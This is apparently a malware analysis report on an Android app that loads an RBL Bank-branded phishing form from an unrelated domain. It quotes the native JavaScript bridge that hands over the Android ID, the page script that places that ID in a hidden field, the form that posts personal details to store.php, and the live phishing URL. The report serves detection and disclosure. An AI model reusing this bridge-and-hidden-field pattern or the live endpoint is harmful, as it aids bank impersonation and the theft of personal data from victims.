# WebView Analysis — RBL-Themed Android Application

## 1. Executive Summary

Static analysis of the Android application identified an embedded WebView that loads an externally hosted RBL Bank-themed service form.

The application enables JavaScript and exposes a native JavaScript interface named `Android`. Its `getDeviceId()` method retrieves the Android ID using `Settings.Secure.ANDROID_ID`.

The remote webpage explicitly invokes this method and assigns the returned identifier to a hidden HTML form field named `device_id`.

The webpage also collects a user's name, mobile number, date of birth and selected service. Its form is configured to submit these fields through an HTTP POST request to `store.php`.

These findings establish a connection between the APK's native device-identification functionality and the webpage's personal-information collection mechanism.

The backend's actual handling of submitted information has not been established.

## 2. Remote WebView URL

**URL:**
`https://z.devalphas.online/sb/rb3/fx/`

**Observed page title:** RBL Bank Service Form

**HTTP response:** 200 OK

**Hosting observations:**
- DNS A records: `104.21.81.190`, `172.67.145.245`
- Cloudflare identified in response headers.
- LiteSpeed identified through the `x-turbo-charged-by` header.
- Content type: `text/html`.

The resolved IP addresses belong to Cloudflare infrastructure and do not independently identify the origin server.

A request to the URL without its trailing slash returned HTTP 301, redirecting to the trailing-slash version.

## 3. WebView Implementation in the APK

The recovered `MainActivity.onCreate()` instructions establish the following:

- A WebView is initialized.
- JavaScript is enabled through `setJavaScriptEnabled(true)`.
- A default `WebViewClient` is assigned.
- A native JavaScript interface is registered using `addJavascriptInterface()`.
- The interface is exposed under the name `Android`.
- The remote URL is loaded using `loadUrl()`.

**Remote URL loaded by the APK:**

`https://z.devalphas.online/sb/rb3/fx/`

## 4. Native JavaScript Bridge

**Bridge class:** `i2.C0274m`  
**DEX descriptor:** `Li2/m;`  
**Exposed interface name:** `Android`

The recovered method is:

```java
@JavascriptInterface
public String getDeviceId() {
    return Settings.Secure.getString(
        context.getContentResolver(),
        "android_id"
    );
}
```

The method retrieves the Android ID and returns it as a string.

A source-level search for `@JavascriptInterface` in `C0274m.java` identified one annotation, associated with `getDeviceId()`.

This finding establishes that the WebView exposes this device-identification method to JavaScript.

## 5. Webpage Structure and Branding

The captured webpage displays:

- RBL BANK branding and logo.
- Browser title: RBL Bank Service Form.
- Customer service and credit-card helpline numbers.
- Name input.
- Mobile number input.
- Date-of-birth input.
- Banking service selection.
- Submit button.
- Privacy Policy, Terms & Conditions and Security links.

The page is hosted on `z.devalphas.online`, rather than an RBL Bank domain.

The observed presentation is consistent with an RBL Bank brand-impersonation page. The screenshot documents the visual presentation but does not independently establish the page operator's identity.

## 6. Personal Information Collection

The HTML contains the following form:

```html
<form action="store.php"
      method="POST"
      name="rbl_service_form">
```

The identified fields are:

| Field | Description |
|---|---|
| `name` | Full name |
| `mobile` | Mobile number |
| `dob` | Date of birth |
| `service` | Selected banking service |
| `step` | Hidden field, value `1` |
| `bucket_id` | Hidden session identifier |
| `device_id` | Hidden device identifier |

The service dropdown includes:

- Rupay Card
- Card Blocked
- Limit Increase
- New Card Apply
- Other

The date-of-birth JavaScript formats the input into DD/MM/YYYY notation. This is input formatting, not proof of actual date validation.

## 7. Device Identification Integration

The webpage contains the following JavaScript:

```javascript
document.addEventListener("DOMContentLoaded", function () {
    try {
        const deviceId = Android.getDeviceId();
        document.getElementById("device_id").value = deviceId;
    } catch (e) {
        console.log("Android interface not available:", e);
    }
});
```

This creates a direct connection between the APK's native JavaScript bridge and the webpage.

The execution flow is:

1. The APK loads the remote webpage in its WebView.
2. The APK exposes the native interface under `Android`.
3. The webpage calls `Android.getDeviceId()`.
4. The native method retrieves the Android ID.
5. JavaScript assigns the returned value to the hidden `device_id` field.
6. The form is configured to submit the field through `store.php`.

**Assessment:** The webpage explicitly attempts to obtain the Android ID through the APK's native interface and place it into the form.

The actual value returned during a victim session and its successful receipt by the backend have not been independently verified.

## 8. Session Identification

The webpage generates a bucket identifier when one is not already present in browser session storage.

```javascript
let bucketId = sessionStorage.getItem("bucket_id");

if (!bucketId) {
    bucketId = "id_" + Math.random().toString(36).substr(2, 9);
    sessionStorage.setItem("bucket_id", bucketId);
}

document.getElementById("bucket_id").value = bucketId;
```

This identifier is stored in `sessionStorage` and assigned to the hidden `bucket_id` field.

The implementation provides a session-level identifier. Its actual backend purpose is unknown.

## 9. Form Submission Endpoint

**Configured endpoint:**

`https://z.devalphas.online/sb/rb3/fx/store.php`

**HTTP method configured in HTML:** POST

A separate GET request to this endpoint returned:

- HTTP 200 OK.
- `text/html; charset=UTF-8`.
- A PHP session cookie named `PHPSESSID`.
- `Cache-Control: no-store, no-cache, must-revalidate`.

This confirms that the endpoint responds to GET requests and issues a PHP session cookie.

No POST request was performed.

Consequently, the following remain unverified:

- Whether POST submissions are accepted.
- Whether submitted fields are stored.
- Whether information is forwarded to another destination.
- Whether additional data is collected by the backend.
- Whether the endpoint has additional processing stages.

## 10. Evidence Register

| Evidence ID | Description |
|---|---|
| WEBVIEW-001 | Screenshot showing the RBL Bank-themed service form |
| WEBVIEW-002 | Recovered `MainActivity.onCreate()` WebView instructions |
| WEBVIEW-003 | Recovered `getDeviceId()` implementation |
| WEBVIEW-004 | JavaScript bridge invocation in captured webpage HTML |
| WEBVIEW-005 | HTML form fields and `store.php` submission configuration |
| WEBVIEW-006 | DNS and HTTP response observations |
| WEBVIEW-007 | GET response from `store.php` |
| WEBVIEW-008 | Captured HTML and SHA-256 hash |

### Captured HTML integrity

File:

`webview_recovery/url_capture/page.html`

SHA-256:

`fd179808cc1c5a579e292ce21e0d35d3f41ef98abda240c6be597ab1d1a1bcc6`

Headers:

`webview_recovery/url_capture/response_headers.txt`

## 11. Security Assessment

The investigation identified the following concerns:

1. **Brand impersonation:** The webpage presents RBL Bank branding while being hosted on an unrelated domain.
2. **Personal-information collection:** The form requests full name, mobile number, date of birth and banking service selection.
3. **Device identification:** The APK exposes Android ID through a native JavaScript bridge.
4. **Hidden identifier submission:** The webpage assigns the device identifier to a hidden form field.
5. **Session correlation:** A separate bucket identifier is generated and included in the form.
6. **Remote content dependency:** The application loads its principal WebView content from an externally hosted URL.

The combination of these mechanisms presents a significant potential privacy and phishing risk.

## 12. Investigation Limitations

The investigation was performed through static APK inspection and non-submitting HTTP requests.

The following activities were not performed:

- Submitting personal information.
- Submitting dummy form data.
- Testing backend POST processing.
- Accessing or modifying backend records.
- Verifying actual data retention or exfiltration.
- Establishing the identity of the domain operator.
- Establishing whether the page was served identically to every user.

The presence of a JavaScript bridge also creates a security concern if untrusted or attacker-controlled content can access it. The complete navigation and origin-control behavior has not yet been established.

## 13. Conclusion

The APK contains an embedded WebView configured to load an externally hosted RBL Bank-themed service form.

The native application exposes an Android ID retrieval method through a JavaScript interface named `Android`. The remote webpage explicitly invokes that method and assigns the returned identifier to a hidden form field.

The same webpage collects personal information and configures an HTTP POST submission to a PHP endpoint.

These findings establish an integrated device-identification and personal-information collection mechanism within the application and its remote webpage.

However, successful backend collection, storage, forwarding or exfiltration has not been demonstrated.

**Overall assessment:** Suspicious RBL Bank brand impersonation with confirmed native-to-web device identifier integration and configured personal-information submission.
